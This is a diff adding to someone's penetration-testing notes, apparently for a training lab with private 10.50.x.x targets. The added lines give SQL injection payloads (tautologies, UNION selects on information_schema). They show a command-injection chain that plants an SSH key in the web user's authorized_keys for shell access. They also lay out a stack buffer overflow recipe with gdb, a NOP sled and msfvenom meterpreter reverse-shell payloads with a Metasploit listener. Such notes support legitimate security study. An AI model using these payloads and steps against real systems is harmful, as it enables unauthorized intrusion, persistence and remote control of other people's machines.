@@ -27,6 +27,49 @@
 		ping it again
 	
 ### Web Injection
+	http://10.50.31.75/robots.txt -> Robots.txt -> /path -> Directory Traversal
+	http://10.50.31.75/cmdinjection -> cmd injection
+	http://10.50.40.114 SQL injection
+	http://10.50.40.114/Union.html -> SQl Injection
+		Find Vulnerable Page
+		
+			Selection=2 or 1=1
+			Selection=2 or 1=1;
+			Selection=2 or 1=1; #
+		
+		Check tables
+			<category>=<#> UNION sellect 1,2,3,...X ;
+		
+		Golden Statment
+			UNION select <>,<>,<> from information_schema.columns ; #make it reflect as database,table,col.
+			UNION select <column>,<column2>,..,<columnX> from <database>.<table>
+		
+		Find Version
+			Selection=2 UNION select 1,2,@@version ;
+	
+	CMD Injection -> SSH Keygen
+		Lin>
+			ssh-keygen -t rsa -b 4096
+			y, blank, blank
+			cd .ssh/
+			cat id_rsa.pub
+			"copy ENTIRE thing"
+		Web>
+			cat /etc/passwd, find the home dir
+			; ls -la /var/www/
+			; mkdir /var/www/.ssh
+			; ls -la /var/www/
+			; echo "<id_rsa.pub>" > /var/www/.ssh/authorized_keys
+			; cat /var/www/.ssh/authorized_keys
+		Lin>
+			ssh -i id_rsa www-data@10.50.31.75
+			
+	Uploads
+		1) Can you upload
+		2) Is it santized
+		3) Can you reach it
+###	
+
 	Look at the websites found from the nmap scan below
 		nmap -v -sT -Pn -T4 -sV --script=http-enum.nse <webserver> -p 80
 	Check for robots.txt
@@ -119,8 +162,51 @@
 		exploit -> will start the listening for the reverse shell
 		
 		
-#### Llinux
+#### Llinux IF LINUX HAS GDB DO BUFF OVERFLOW!!!!!!!!!!!!!!!!!!!!!!!
 
+1) Run the func
+2) Understand how it takes, command lind arg, user input
+	if it takes user input <<<$(echo "")
+3) run gdb to find eip and esp registers, wiremask.eu, tools, buff overflow
+	gdb ./func <<<$(echo "buff overflow pattern")
+4) find eip register, take back to wiremask.eu, get bite offset
+	"in script" -> get the byte offset
+		buf = "A" * 62
+5) env - gdb ./func to find the jmp register
+	show env
+	unset env COLUMNS
+	unset env LINES
+	show env
+6) run "Enough to crash it"
+7) info proc map
+8) find /b <1st Mem Addr After Heap> <Last Mem Addr Before Stack>
+	copy those into script
+	```
+	0xf7de3b59  
+	0xf7f588ab
+	0xf7f645fb
+	0xf7f6460f
+	0xf7f64aeb
+	```
+9) Make little Endian
+	0xf7de3b59 ->
+	buf += "\x59\x3b\xde\xf7"
+	
+10) NO-OP Sled
+	buf +="\x90" * 10
+	
+11) Create Payload via msfvenom
+	msfvenom -p linux/x86/exec CMD='whoami [&& ifconfig]' -b '\x00' -f python
+	msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=<linops> lport=4444 -b '\x00' -f python
+	need the multi handler
+	msfconsole
+	use multi/handler
+	set payload linux/x86/meterpreter/reverse_tcp 
+	set lhost 0.0.0.0
+	set lport 4444
+	exploit -> will start the listening for the reverse shell
+12) put in script ^^
+	
 #!/usr/bin/python2.7
 
 # Fill UP THE BUFFER
